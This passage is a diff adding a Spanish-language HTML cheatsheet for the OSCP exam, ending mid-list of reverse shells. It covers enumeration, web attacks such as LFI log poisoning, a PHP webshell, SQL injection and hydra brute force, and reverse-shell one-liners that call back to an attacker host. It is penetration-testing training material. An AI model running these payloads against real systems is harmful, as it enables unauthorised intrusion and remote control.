@@ -1,0 +1,1134 @@
+<!doctype html><html lang="es"><head><meta charset="utf8"><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>Cheatsheet OSCP</title>
+<meta name="description" content="Metodología y cheatsheet navegable para el examen OSCP: enumeración, web, shells, pivoting, privesc Linux y Windows, Active Directory y gestión de examen.">
+<style>
+:root{
+  --bg:#f4f5f7; --panel:#ffffff; --panel-2:#eceef2; --fg:#1b1f27; --muted:#5b6270;
+  --line:#d8dce3; --accent:#c2621a; --accent-soft:#f3e2d2;
+  --code-bg:#1c2128; --code-fg:#e4e8ee; --code-tok:#e0a66a;
+  --good:#1f7a4d; --warn:#9a6a00; --crit:#b2302b; --info:#2563a8;
+  --mono:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  --sans:"Inter",system-ui,-apple-system,Segoe UI,Roboto,sans-serif;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#0f1319; --panel:#161b22; --panel-2:#1c222b; --fg:#e6e9ee; --muted:#8b94a3;
+  --line:#2a313b; --accent:#e08c42; --accent-soft:#2a2016;
+  --code-bg:#0b0e13; --code-fg:#dbe2ea; --code-tok:#e0a66a;
+  --good:#52c08a; --warn:#d8a43a; --crit:#f0756e; --info:#6aa8e8; color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#0f1319; --panel:#161b22; --panel-2:#1c222b; --fg:#e6e9ee; --muted:#8b94a3;
+  --line:#2a313b; --accent:#e08c42; --accent-soft:#2a2016;
+  --code-bg:#0b0e13; --code-fg:#dbe2ea; --code-tok:#e0a66a;
+  --good:#52c08a; --warn:#d8a43a; --crit:#f0756e; --info:#6aa8e8; color-scheme:dark;
+}
+*{box-sizing:border-box}
+html{scroll-padding-top:env(safe-area-inset-top,0px)}
+body{background:var(--bg);color:var(--fg);font-family:var(--sans);line-height:1.55;margin:0;font-size:15px}
+a{color:var(--accent)}
+img{max-width:100%}
+.wrap{display:grid;grid-template-columns:270px minmax(0,1fr);gap:0;max-width:1440px;margin:0 auto}
+.nav{position:sticky;top:env(safe-area-inset-top,0px);align-self:start;height:100dvh;overflow-y:auto;
+  border-right:1px solid var(--line);background:var(--panel);
+  padding:20px max(14px,env(safe-area-inset-left,0px)) 40px 14px}
+.brand{font-weight:800;font-size:16px;letter-spacing:.3px;display:flex;align-items:center;gap:8px;margin-bottom:4px}
+.brand .dot{width:9px;height:9px;border-radius:50%;background:var(--accent);box-shadow:0 0 0 3px var(--accent-soft)}
+.brand small{display:block;color:var(--muted);font-weight:500;font-size:11px;letter-spacing:0}
+.search{width:100%;margin:14px 0;padding:9px 11px;border:1px solid var(--line);border-radius:8px;
+  background:var(--panel-2);color:var(--fg);font-family:var(--sans);font-size:13px}
+.search:focus{outline:2px solid var(--accent);outline-offset:1px}
+.nav ul{list-style:none;margin:0;padding:0}
+.nav li a{display:block;padding:6px 10px;border-radius:7px;color:var(--muted);text-decoration:none;
+  font-size:13px;font-weight:500;border-left:2px solid transparent}
+.nav li a:hover{background:var(--panel-2);color:var(--fg)}
+.nav li a.active{color:var(--accent);background:var(--accent-soft);border-left-color:var(--accent);font-weight:600}
+.nav .grp{font-size:10.5px;text-transform:uppercase;letter-spacing:1px;color:var(--muted);
+  margin:16px 0 4px 10px;font-weight:700;opacity:.8}
+.main{padding:28px max(18px,env(safe-area-inset-right,0px)) 80px max(18px,env(safe-area-inset-left,0px));min-width:0}
+header.top{margin-bottom:8px}
+header.top h1{font-size:28px;margin:0 0 6px;text-wrap:balance;letter-spacing:-.3px}
+header.top p{color:var(--muted);margin:0;max-width:64ch}
+.mantra{margin:18px 0;padding:14px 16px;border:1px solid var(--line);border-left:3px solid var(--accent);
+  border-radius:8px;background:var(--panel);font-weight:600}
+.mantra span{color:var(--accent)}
+section{margin:30px 0;scroll-margin-top:16px}
+section>h2{font-size:21px;margin:0 0 4px;padding-bottom:7px;border-bottom:2px solid var(--line);
+  display:flex;align-items:center;gap:9px;letter-spacing:-.2px}
+section>h2 .n{font-family:var(--mono);font-size:13px;color:var(--accent);background:var(--accent-soft);
+  padding:2px 8px;border-radius:6px;font-weight:700}
+h3{font-size:16px;margin:22px 0 6px;color:var(--fg)}
+h4{font-size:13.5px;margin:16px 0 4px;color:var(--muted);text-transform:uppercase;letter-spacing:.6px}
+p{margin:6px 0}
+ul.notes{margin:8px 0;padding-left:20px}
+ul.notes li{margin:3px 0}
+.code{position:relative;background:var(--code-bg);border-radius:9px;margin:9px 0;border:1px solid var(--line)}
+.code pre{margin:0;padding:12px 44px 12px 14px;overflow-x:auto;font-family:var(--mono);font-size:12.5px;
+  line-height:1.5;color:var(--code-fg);white-space:pre}
+.code .cmt{color:#7f8a99}
+.code button.cp{position:absolute;top:7px;right:7px;border:1px solid #3a434f;background:#222932;color:#c9d2dd;
+  border-radius:6px;font-size:11px;padding:3px 8px;cursor:pointer;font-family:var(--sans);opacity:.75}
+.code button.cp:hover{opacity:1;border-color:var(--accent);color:var(--accent)}
+.code button.cp.ok{color:var(--good);border-color:var(--good)}
+.tbl{overflow-x:auto;margin:10px 0;border:1px solid var(--line);border-radius:9px}
+table{border-collapse:collapse;width:100%;font-size:13px;min-width:460px}
+th,td{text-align:left;padding:8px 11px;border-bottom:1px solid var(--line);vertical-align:top}
+th{background:var(--panel-2);font-weight:700;font-size:12px;text-transform:uppercase;letter-spacing:.4px}
+td code,p code,li code{font-family:var(--mono);font-size:12px;background:var(--panel-2);padding:1px 5px;border-radius:4px}
+tr:last-child td{border-bottom:none}
+.tree{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:14px 16px;margin:12px 0}
+.tree ul{list-style:none;margin:0;padding-left:16px;border-left:1px dashed var(--line)}
+.tree>ul{padding-left:4px;border-left:none}
+.tree li{margin:5px 0;position:relative}
+.tree .q{font-weight:700;color:var(--accent)}
+.tree .a{font-family:var(--mono);font-size:12px;color:var(--muted)}
+.pills{display:flex;flex-wrap:wrap;gap:6px;margin:8px 0}
+.pill{font-size:11px;font-weight:600;padding:3px 9px;border-radius:999px;border:1px solid var(--line);background:var(--panel-2)}
+.callout{border-radius:9px;padding:11px 14px;margin:12px 0;border:1px solid var(--line);font-size:13.5px}
+.callout.good{border-left:3px solid var(--good)}
+.callout.warn{border-left:3px solid var(--warn)}
+.callout.crit{border-left:3px solid var(--crit)}
+.callout b{color:var(--fg)}
+.k{font-family:var(--mono);font-size:12px;color:var(--accent)}
+.menu-btn{display:none}
+@media(max-width:860px){
+  .wrap{grid-template-columns:1fr}
+  .nav{position:fixed;z-index:40;top:0;left:0;width:84%;max-width:300px;height:100dvh;
+    transform:translateX(-102%);transition:transform .22s ease;
+    box-shadow:0 0 0 100vmax rgba(0,0,0,0);padding-top:max(20px,env(safe-area-inset-top,0px))}
+  .nav.open{transform:translateX(0);box-shadow:0 0 0 100vmax rgba(0,0,0,.45)}
+  .menu-btn{display:inline-flex;position:fixed;z-index:50;top:max(10px,env(safe-area-inset-top,0px));
+    left:12px;align-items:center;gap:7px;background:var(--panel);border:1px solid var(--line);
+    color:var(--fg);border-radius:9px;padding:8px 12px;font-weight:700;font-size:13px;cursor:pointer}
+  .main{padding-top:58px}
+}
+.theme-t{margin-top:18px;font-size:12px;color:var(--muted);background:none;border:1px solid var(--line);
+  border-radius:7px;padding:6px 10px;cursor:pointer}
+.hidden-s{display:none!important}
+.foot{margin-top:40px;padding-top:16px;border-top:1px solid var(--line);color:var(--muted);font-size:12px}
+</style></head>
+<body>
+<button class="menu-btn" id="mbtn">☰ Índice</button>
+<div class="wrap">
+<nav class="nav" id="nav">
+  <div class="brand"><span class="dot"></span><div>Cheatsheet OSCP<small>Examen · 3 standalone + AD · ampliada</small></div></div>
+  <input class="search" id="search" placeholder="Buscar comando o técnica…" autocomplete="off">
+  <div class="grp">Base</div>
+  <ul>
+    <li><a href="#metodologia">Metodología y mentalidad</a></li>
+    <li><a href="#toolbox">Equivalencias de herramientas</a></li>
+  </ul>
+  <div class="grp">Enumeración</div>
+  <ul>
+    <li><a href="#enum-nmap">Nmap y escaneo</a></li>
+    <li><a href="#enum-puertos">Servicios por puerto</a></li>
+    <li><a href="#enum-web">Enumeración web</a></li>
+  </ul>
+  <div class="grp">Explotación</div>
+  <ul>
+    <li><a href="#web">Ataques web (LFI, SQLi…)</a></li>
+    <li><a href="#shells">Shells y TTY</a></li>
+    <li><a href="#payloads-lang">Payloads por lenguaje</a></li>
+    <li><a href="#transfer">Transferencia de archivos</a></li>
+    <li><a href="#pivoting">Pivoting y tunneling</a></li>
+    <li><a href="#msfvenom">Payloads (msfvenom)</a></li>
+    <li><a href="#cracking">Cracking de hashes</a></li>
+  </ul>
+  <div class="grp">Escalada de privilegios</div>
+  <ul>
+    <li><a href="#priv-linux">PrivEsc Linux</a></li>
+    <li><a href="#priv-win">PrivEsc Windows</a></li>
+  </ul>
+  <div class="grp">Active Directory</div>
+  <ul>
+    <li><a href="#ad-enum">Enumeración AD</a></li>
+    <li><a href="#ad-creds-hunt">Caza de credenciales</a></li>
+    <li><a href="#ad-kerberos">Ataques Kerberos</a></li>
+    <li><a href="#ad-lateral">Movimiento lateral</a></li>
+    <li><a href="#ad-creds">Volcado de credenciales</a></li>
+    <li><a href="#ad-acl">Abuso de ACL y Shadow Creds</a></li>
+    <li><a href="#ad-adcs">AD CS, LAPS y DPAPI</a></li>
+    <li><a href="#ad-extra">Vectores adicionales</a></li>
+    <li><a href="#ad-dominio">Escalada de dominio</a></li>
+    <li><a href="#ad-arbol">Árbol de decisión (9 posiciones)</a></li>
+  </ul>
+  <div class="grp">Diagnóstico</div>
+  <ul>
+    <li><a href="#diag">Cuando algo no funciona</a></li>
+  </ul>
+  <div class="grp">Examen</div>
+  <ul>
+    <li><a href="#atascado">¿Atascado? Qué probar</a></li>
+    <li><a href="#tips">Reglas y gestión</a></li>
+  </ul>
+  <button class="theme-t" id="theme">Cambiar tema</button>
+</nav>
+
+<main class="main">
+<header class="top">
+  <h1>Cheatsheet OSCP — Metodología de examen</h1>
+  <p>Referencia práctica para las 3 máquinas standalone y el set de Active Directory. Cada comando está listo para copiar. Reemplaza <code>$IP</code> por la IP objetivo y <code>$LHOST</code>/<code>$LPORT</code> por tu atacante (Kali).</p>
+</header>
+
+<div class="mantra">Regla de oro: <span>Enumerar, enumerar y enumerar.</span> El 90% del examen es enumeración. Si estás atascado, casi siempre es porque te saltaste un servicio, un puerto, un directorio o una versión. Vuelve a enumerar más a fondo antes de buscar un exploit raro.</div>
+
+<section id="metodologia">
+<h2><span class="n">00</span>Metodología y mentalidad</h2>
+<p>Trabaja siempre en el mismo orden para no olvidar nada bajo presión. Toma notas desde el primer segundo.</p>
+<div class="tbl"><table>
+<tr><th>Fase</th><th>Objetivo</th><th>Salida que buscas</th></tr>
+<tr><td>1. Reconocimiento</td><td>Puertos y servicios abiertos</td><td>Lista de puertos + versiones</td></tr>
+<tr><td>2. Enumeración</td><td>Exprimir cada servicio</td><td>Usuarios, rutas web, shares, versiones exactas</td></tr>
+<tr><td>3. Acceso inicial (foothold)</td><td>Primera shell (normalmente sin privilegios)</td><td>Shell como www-data / usuario</td></tr>
+<tr><td>4. Shell estable</td><td>TTY interactiva + persistencia de sesión</td><td>Shell cómoda, flag de usuario</td></tr>
+<tr><td>5. Escalada de privilegios</td><td>root / SYSTEM / Administrator</td><td>Flag de root/proof.txt</td></tr>
+<tr><td>6. Post / pivote (AD)</td><td>Loot de credenciales y movimiento</td><td>Credenciales, siguiente host, DC</td></tr>
+</table></div>
+<div class="callout warn"><b>Antes de nada:</b> crea tu carpeta de notas por máquina (<span class="k">~/oscp/IP/</span>) y empieza a pegar comandos y <b>screenshots</b> desde el primer flag. El reporte se escribe mientras hackeas, no después.</div>
+<h4>Principios que ahorran horas</h4>
+<ul class="notes">
+<li>Escanea <b>todos</b> los puertos (<code>-p-</code>), no solo los 1000 por defecto. Puertos altos esconden foothold.</li>
+<li>Anota la <b>versión exacta</b> de cada servicio y pásala por <code>searchsploit</code>.</li>
+<li>Prueba credenciales por defecto y reutilización de contraseñas <b>en todos los servicios</b>.</li>
+<li>Rota de máquina si llevas &gt;2h atascado; vuelve con la mente fresca.</li>
+</ul>
+</section>
+
+<section id="toolbox">
+<h2><span class="n">REF</span>Equivalencias de herramientas</h2>
+<p>El examen pide un <b>resultado</b> (enumerar SMB, pedir un TGS, dumpear credenciales, pivotar…), nunca una herramienta concreta. Para cada tarea tienes varias opciones: usa la que tengas instalada, la que funcione en ese objetivo, o la que mejor controles. Esta tabla es tu caja de herramientas; el resto de la guía usa una opción por defecto, pero cualquiera de estas vale.</p>
+<div class="callout good"><b>Nota:</b> <code>netexec</code> (<code>nxc</code>) es el sucesor mantenido de <code>crackmapexec</code> (<code>cme</code>); los comandos son casi idénticos. Donde veas <code>crackmapexec</code>, puedes usar <code>nxc</code>.</div>
+
+<h3>Enumeración y acceso</h3>
+<div class="tbl"><table>
+<tr><th>Tarea</th><th>Opciones (elige una)</th></tr>
+<tr><td>Escaneo de puertos</td><td><code>nmap</code>, <code>rustscan</code>, <code>masscan</code>, <code>nc -zv</code></td></tr>
+<tr><td>Enum SMB / shares</td><td><code>smbclient</code>, <code>smbmap</code>, <code>crackmapexec/nxc smb</code>, <code>enum4linux-ng</code>, <code>rpcclient</code>, <code>nmap --script smb-*</code></td></tr>
+<tr><td>Fuzzing web (dirs/archivos)</td><td><code>feroxbuster</code>, <code>ffuf</code>, <code>gobuster</code>, <code>dirsearch</code>, <code>wfuzz</code></td></tr>
+<tr><td>Enum CMS</td><td><code>wpscan</code> (WP), <code>droopescan</code> (Drupal), <code>joomscan</code> (Joomla), <code>nuclei</code></td></tr>
+<tr><td>Fuerza bruta de login</td><td><code>hydra</code>, <code>medusa</code>, <code>ncrack</code>, <code>patator</code>, <code>crackmapexec/nxc</code></td></tr>
+</table></div>
+
+<h3>Shells, transferencia y pivoting</h3>
+<div class="tbl"><table>
+<tr><th>Tarea</th><th>Opciones (elige una)</th></tr>
+<tr><td>Reverse/bind shell</td><td><code>bash</code>, <code>python</code>, <code>perl</code>, <code>php</code>, <code>ruby</code>, <code>nc</code>, <code>socat</code>, <code>powershell</code>, <code>msfvenom</code> (ver <a href="#payloads-lang">payloads</a>)</td></tr>
+<tr><td>TTY interactiva</td><td><code>python pty</code>+<code>stty</code>, <code>socat</code>, <code>script</code>, <b>ConPtyShell</b> (Windows)</td></tr>
+<tr><td>Transferencia de archivos</td><td><code>python3 -m http.server</code>, <code>impacket-smbserver</code>, <code>nc</code>, <code>certutil</code>, <code>wget/curl</code>, <code>scp</code>, <code>evil-winrm upload/download</code></td></tr>
+<tr><td>Pivoting / tunneling</td><td><code>ligolo-ng</code>, <code>chisel</code>, <code>ssh -L/-R/-D</code>, <code>sshuttle</code>, <code>socat</code>, <code>plink.exe</code>, <code>netsh portproxy</code></td></tr>
+</table></div>
+
+<h3>Escalada de privilegios</h3>
+<div class="tbl"><table>
+<tr><th>Tarea</th><th>Opciones (elige una)</th></tr>
+<tr><td>Enum privesc Linux</td><td><code>linpeas</code>, <code>LinEnum</code>, <code>lse.sh</code>, <code>pspy</code>, <code>sudo -l</code> + checks manuales, <a href="https://gtfobins.github.io" target="_blank" rel="noopener">GTFOBins</a></td></tr>
+<tr><td>Enum privesc Windows</td><td><code>winPEAS</code>, <code>PrivescCheck</code>, <code>PowerUp</code>, <code>Seatbelt</code>, <code>accesschk</code>, <a href="https://lolbas-project.github.io" target="_blank" rel="noopener">LOLBAS</a></td></tr>
+<tr><td>Abuso de token (Windows)</td><td><code>PrintSpoofer</code>, <code>GodPotato</code>, <code>JuicyPotatoNG</code>, <code>RoguePotato</code>, <code>SweetPotato</code></td></tr>
+<tr><td>Cracking de hashes</td><td><code>hashcat</code>, <code>john</code> (ver <a href="#cracking">cracking</a>)</td></tr>
+</table></div>
+
+<h3>Active Directory</h3>
+<div class="tbl"><table>
+<tr><th>Tarea</th><th>Opciones (elige una)</th></tr>
+<tr><td>Enum LDAP / dominio</td><td><code>ldapsearch</code>, <code>windapsearch</code>, <code>ldapdomaindump</code>, <code>ldeep</code>, <code>nxc ldap</code>, <code>bloodhound-python</code> / <code>SharpHound</code>, <code>PowerView</code>, <code>bloodyAD</code></td></tr>
+<tr><td>Ejecución remota</td><td><code>evil-winrm</code>, <code>impacket-psexec</code>, <code>wmiexec</code>, <code>smbexec</code>, <code>atexec</code>, <code>dcomexec</code>, <code>winrs</code>, <code>nxc</code></td></tr>
+<tr><td>Kerberoasting / AS-REP</td><td><code>impacket-GetUserSPNs</code> / <code>GetNPUsers</code>, <code>Rubeus</code>, <code>nxc</code>, <code>kerbrute</code></td></tr>
+<tr><td>Password spraying</td><td><code>kerbrute</code>, <code>crackmapexec/nxc</code>, <code>hydra</code></td></tr>
+<tr><td>Volcado de credenciales</td><td><code>impacket-secretsdump</code>, <code>mimikatz</code>, <code>lsassy</code>, <code>pypykatz</code>, <code>nanodump</code>, <code>reg save</code> + secretsdump offline</td></tr>
+<tr><td>Abuso de ACL / objetos</td><td><code>bloodyAD</code>, <code>PowerView</code> (<code>Add-DomainObjectAcl</code>…), <code>dacledit</code>, <code>owneredit</code>, <code>net rpc</code>, <code>pywhisker</code> (shadow creds)</td></tr>
+<tr><td>Tickets (PtT / forja)</td><td><code>impacket-getTGT</code> / <code>ticketer</code>, <code>Rubeus</code>, <code>klist</code>/<code>KRB5CCNAME</code></td></tr>
+</table></div>
+<div class="callout warn"><b>Mentalidad de examen:</b> ante cada situación, piensa primero <i>"qué quiero conseguir"</i> (p.ej. "listar usuarios del dominio") y luego elige la herramienta de esta tabla. Si una falla (bloqueada, no instalada, el objetivo no la soporta), baja a la siguiente. No memorices una herramienta: memoriza la tarea y ten 2-3 alternativas por cada una.</div>
+</section>
+
+<section id="enum-nmap">
+<h2><span class="n">01</span>Nmap y escaneo</h2>
+<h4>Barrido rápido inicial (mientras piensas)</h4>
+<div class="code"><pre># Rápido: solo abiertos, todos los puertos
+nmap -p- --min-rate 2000 -T4 -Pn $IP -oN nmap/allports.txt</pre></div>
+<h4>Escaneo de servicios y scripts sobre los puertos encontrados</h4>
+<div class="code"><pre># Sustituye 22,80,445 por los puertos abiertos reales
+nmap -p 22,80,445 -sC -sV -A -Pn $IP -oN nmap/services.txt</pre></div>
+<h4>UDP (lento pero clave para SNMP/DNS/TFTP)</h4>
+<div class="code"><pre>sudo nmap -sU --top-ports 100 -Pn $IP -oN nmap/udp.txt</pre></div>
+<h4>Scripts NSE por vulnerabilidad</h4>
+<div class="code"><pre>nmap -p 445 --script "smb-vuln*" -Pn $IP
+nmap -p 80 --script "http-enum" -Pn $IP</pre></div>
+<div class="callout good"><b>Tip:</b> lanza el <code>-p-</code> y, sin esperar a que acabe, empieza a enumerar el puerto 80/445 que casi siempre aparece. Paraleliza.</div>
+</section>
+
+<section id="enum-puertos">
+<h2><span class="n">02</span>Enumeración de servicios por puerto</h2>
+
+<h3>FTP — 21</h3>
+<div class="code"><pre># Login anónimo
+ftp $IP        # usuario: anonymous / pass: vacío o anonymous
+# Dentro: binary, ls -la, get archivo, put shell
+# Versión vulnerable (vsftpd 2.3.4, ProFTPD...) -> searchsploit</pre></div>
+
+<h3>SSH — 22</h3>
+<div class="code"><pre>ssh usuario@$IP
+# Si tienes clave: chmod 600 id_rsa; ssh -i id_rsa usuario@$IP
+# Clave con passphrase -> ssh2john id_rsa &gt; hash; john hash</pre></div>
+
+<h3>SMTP — 25</h3>
+<div class="code"><pre># Enumerar usuarios válidos
+smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/names.txt -t $IP
+nc -nv $IP 25   # VRFY root / EXPN</pre></div>
+
+<h3>DNS — 53</h3>
+<div class="code"><pre># Transferencia de zona (si la permite)
+dig axfr @$IP dominio.local
+dnsrecon -d dominio.local -n $IP -t axfr</pre></div>
+
+<h3>HTTP / HTTPS — 80 / 443</h3>
+<div class="code"><pre>whatweb http://$IP
+# Mira el código fuente, /robots.txt, comentarios, versiones de CMS
+nikto -h http://$IP
+# HTTPS: revisa el CN/SAN del certificado -> suele dar hostnames/vhosts</pre></div>
+<p>Ver sección <a href="#enum-web">Enumeración web</a> para fuzzing de directorios y vhosts.</p>
+
+<h3>POP3/IMAP — 110 / 143</h3>
+<div class="code"><pre>nc -nv $IP 110
+# USER x / PASS y / LIST / RETR 1   (leer correos = credenciales)</pre></div>
+
+<h3>RPC — 111 / 135</h3>
+<div class="code"><pre>rpcinfo -p $IP
+rpcclient -U "" -N $IP      # null session
+# Dentro: enumdomusers, enumdomgroups, querydominfo, getdompwinfo</pre></div>
+
+<h3>SMB — 139 / 445</h3>
+<div class="code"><pre># Listar shares (varias formas, prueba todas)
+smbclient -L //$IP/ -N
+smbmap -H $IP
+smbmap -H $IP -u 'guest' -p ''
+crackmapexec smb $IP --shares -u '' -p ''
+# Conectar a un share y descargar
+smbclient //$IP/Share -N
+# Enumeración completa null session
+enum4linux-ng -A $IP</pre></div>
+<div class="callout crit"><b>Siempre prueba:</b> sesión nula (<code>-N</code>), usuario <code>guest</code>, y credenciales que ya tengas. SMB es foothold y fuente de loot constante.</div>
+
+<h3>SNMP — 161 (UDP)</h3>
+<div class="code"><pre>snmpwalk -v2c -c public $IP
+snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25   # usuarios
+snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2  # procesos
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP</pre></div>
+
+<h3>LDAP — 389 / 636</h3>
+<div class="code"><pre>ldapsearch -x -H ldap://$IP -s base namingcontexts
+ldapsearch -x -H ldap://$IP -b "DC=dominio,DC=local"</pre></div>
+
+<h3>MSSQL — 1433</h3>
+<div class="code"><pre>impacket-mssqlclient dominio/usuario:pass@$IP -windows-auth
+# Dentro: enable_xp_cmdshell; EXEC xp_cmdshell 'whoami';
+crackmapexec mssql $IP -u usuario -p pass</pre></div>
+
+<h3>NFS — 2049</h3>
+<div class="code"><pre>showmount -e $IP
+mkdir /mnt/nfs; sudo mount -t nfs $IP:/ruta /mnt/nfs -o nolock
+# no_root_squash -> potencial privesc (crea binario SUID como root local)</pre></div>
+
+<h3>MySQL — 3306</h3>
+<div class="code"><pre>mysql -h $IP -u root -p
+# Dentro: show databases; use x; select * from users;</pre></div>
+
+<h3>RDP — 3389</h3>
+<div class="code"><pre>xfreerdp /u:usuario /p:pass /v:$IP /cert:ignore +clipboard /dynamic-resolution
+# Fuerza bruta puntual (cuidado con lockouts):
+crackmapexec rdp $IP -u usuario -p pass</pre></div>
+
+<h3>WinRM — 5985 / 5986</h3>
+<div class="code"><pre>crackmapexec winrm $IP -u usuario -p pass
+evil-winrm -i $IP -u usuario -p pass        # shell interactiva Windows</pre></div>
+</section>
+
+<section id="enum-web">
+<h2><span class="n">03</span>Enumeración web</h2>
+<h4>Fuzzing de directorios y archivos</h4>
+<div class="code"><pre>feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,txt,html
+
+gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -t 50
+
+ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php,.txt,.html</pre></div>
+<h4>Vhosts / subdominios (cuando hay hostname)</h4>
+<div class="code"><pre># Primero añade el hostname a /etc/hosts
+echo "$IP  dominio.htb" | sudo tee -a /etc/hosts
+# Fuzz de vhost por cabecera Host
+ffuf -u http://dominio.htb -H "Host: FUZZ.dominio.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0</pre></div>
+<h4>Parámetros ocultos</h4>
+<div class="code"><pre>ffuf -u "http://$IP/page.php?FUZZ=1" -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs 0</pre></div>
+<ul class="notes">
+<li>Ajusta el filtro: <code>-fs</code> (tamaño), <code>-fc 404</code> (código), <code>-fw</code> (palabras).</li>
+<li>Siempre revisa manualmente el código fuente, cabeceras y cookies.</li>
+<li>Busca paneles de login, CMS (WordPress → <code>wpscan</code>), y archivos de backup (<code>.bak</code>, <code>~</code>, <code>.old</code>).</li>
+</ul>
+<h4>CMS conocidos</h4>
+<div class="code"><pre># WordPress
+wpscan --url http://$IP --enumerate u,p,t --api-token TOKEN
+wpscan --url http://$IP -U users.txt -P rockyou.txt   # brute del login
+# Drupal / Joomla
+droopescan scan drupal -u http://$IP
+joomscan -u http://$IP</pre></div>
+</section>
+
+<section id="web">
+<h2><span class="n">04</span>Ataques web</h2>
+
+<h3>LFI / RFI (Local/Remote File Inclusion)</h3>
+<div class="code"><pre># LFI básico
+http://$IP/index.php?page=../../../../etc/passwd
+# Filtro PHP para leer código fuente en base64
+http://$IP/index.php?page=php://filter/convert.base64-encode/resource=config.php
+# LFI a RCE vía logs (envenena User-Agent con &lt;?php system($_GET['c']); ?&gt;)
+http://$IP/index.php?page=/var/log/apache2/access.log&c=id
+# Archivos interesantes en Windows
+http://$IP/index.php?page=../../../../windows/system32/drivers/etc/hosts</pre></div>
+<div class="callout good">Wordlist útil para LFI: <code>/usr/share/seclists/Fuzzing/LFI/</code>. Prueba wrappers <code>php://</code>, <code>data://</code>, <code>expect://</code>.</div>
+
+<h3>Subida de archivos (File Upload)</h3>
+<div class="code"><pre># Sube una webshell PHP
+echo '&lt;?php system($_GET["cmd"]); ?&gt;' &gt; shell.php
+# Bypass de extensión: shell.php.jpg, shell.phtml, shell.php5, PHP (mayúsculas)
+# Bypass de Content-Type: cámbialo a image/png en Burp
+# Magic bytes: antepón GIF89a; al contenido</pre></div>
+
+<h3>Inyección SQL (SQLi)</h3>
+<div class="code"><pre># Bypass de login típico
+' OR '1'='1'-- -
+admin'-- -
+# UNION: averigua nº de columnas
+' ORDER BY 1-- -   (sube hasta error)
+' UNION SELECT 1,2,3-- -
+' UNION SELECT user(),database(),version()-- -
+# sqlmap (automatiza; guarda la request con Burp -> req.txt)
+sqlmap -r req.txt --batch --dbs
+sqlmap -r req.txt --batch -D db -T users --dump
+# RCE si es MSSQL o permisos FILE:
+sqlmap -r req.txt --os-shell</pre></div>
+
+<h3>Inyección de comandos (Command Injection)</h3>
+<div class="code"><pre># Separadores a probar en campos que ejecutan comandos
+; id
+| id
+`id`
+$(id)
+&amp;&amp; id
+%0a id        # salto de línea URL-encoded</pre></div>
+
+<h3>Autenticación y fuerza bruta</h3>
+<div class="code"><pre># Formularios web (ajusta el patrón de fallo)
+hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form \
+"/login.php:user=^USER^&amp;pass=^PASS^:Invalid"
+# Servicios
+hydra -L users.txt -P rockyou.txt ssh://$IP
+hydra -l admin -P rockyou.txt ftp://$IP</pre></div>
+
+<h3>searchsploit (exploits conocidos)</h3>
+<div class="code"><pre>searchsploit nombre version
+searchsploit -m 12345        # copia el exploit a tu carpeta
+searchsploit -x 12345        # lo muestra</pre></div>
+<div class="callout warn"><b>Siempre lee el exploit antes de ejecutarlo.</b> Ajusta IPs, puertos y rutas. Entiende qué hace: en el examen debes explicarlo en el reporte.</div>
+</section>
+
+<section id="shells">
+<h2><span class="n">05</span>Shells y mejora de TTY</h2>
+<h4>Listener en Kali</h4>
+<div class="code"><pre>nc -lvnp $LPORT
+# Mejor: rlwrap nc -lvnp $LPORT   (historial y flechas)</pre></div>
+<h4>Reverse shells (Linux objetivo) — rápidas</h4>
+<div class="code"><pre>bash -c 'bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1'
+# nc sin -e
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc $LHOST $LPORT &gt;/tmp/f</pre></div>
+<p>Catálogo completo por lenguaje (Linux y Windows) en la sección <a href="#payloads-lang">Payloads por lenguaje</a>.</p>
+<h4>Upgrade a TTY interactiva (Linux) — imprescindible</h4>
+<div class="code"><pre># 1) En la shell:
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+# 2) Ctrl+Z (vuelve a Kali)
+stty raw -echo; fg
+# 3) Enter, y luego:
+export TERM=xterm; stty rows 38 columns 116</pre></div>
+<div class="callout good">Alternativa si no hay python: <code>script -qc /bin/bash /dev/null</code>. Con TTY completa puedes usar <code>su</code>, <code>sudo</code>, editores y Ctrl+C sin perder la shell. El método con <code>socat</code> (ver abajo) da una TTY completa de una sola vez.</div>
+</section>
+
+<section id="payloads-lang">
+<h2><span class="n">06</span>Payloads de shell por lenguaje</h2>
+<p>Cuando la reverse shell básica falla, prueba otro intérprete según lo que haya instalado en el objetivo. Pon siempre primero el listener en Kali (<code>nc -lvnp $LPORT</code>).</p>
+<div class="callout good">Generador de referencia (ya conocido, muy útil para codificar/URL-encode): <a href="https://www.revshells.com" target="_blank" rel="noopener">revshells.com</a>. Aun así, memoriza bash, python, nc-mkfifo y la de PowerShell.</div>
+
+<h3>Reverse shells — Linux / Unix</h3>
+<div class="code"><pre># Bash
+bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1
+# Bash (envoltura, más fiable al inyectar)
+bash -c 'bash -i &gt;&amp; /dev/tcp/$LHOST/$LPORT 0&gt;&amp;1'
+# sh + mkfifo (cuando no hay bash ni nc -e)
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc $LHOST $LPORT &gt;/tmp/f
+# Python3
+python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("$LHOST",$LPORT));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
+# Perl
